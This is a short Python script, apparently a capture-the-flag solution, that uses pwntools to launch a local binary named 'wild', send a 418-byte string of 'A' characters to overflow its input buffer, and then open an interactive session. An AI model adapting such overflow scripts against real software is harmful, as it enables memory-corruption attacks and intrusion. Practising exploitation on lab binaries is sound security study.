from pwn import *

elf = ELF('./wild')

io = elf.process()

pld = b"A" * 418

io.sendline(pld)

io.interactive()
